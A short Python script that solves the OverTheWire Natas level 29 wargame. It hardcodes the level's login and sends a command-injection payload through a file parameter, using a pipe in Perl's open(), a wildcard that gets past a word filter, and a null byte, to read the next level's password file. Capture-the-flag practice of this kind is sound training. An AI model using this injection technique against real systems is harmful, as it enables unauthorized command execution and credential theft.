import requests
from requests.auth import HTTPBasicAuth

url = "http://natas29.natas.labs.overthewire.org/index.pl"
auth = HTTPBasicAuth("natas29", "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

# pipe '|' forces Perl open() to execute bash commands.
# wildcard '*' bypasses the 'natas' word filter.
payload = "|cat /etc/*_webpass/*30\0"

params = {"file": payload}

response = requests.get(url, auth=auth, params=params)

print(response.text)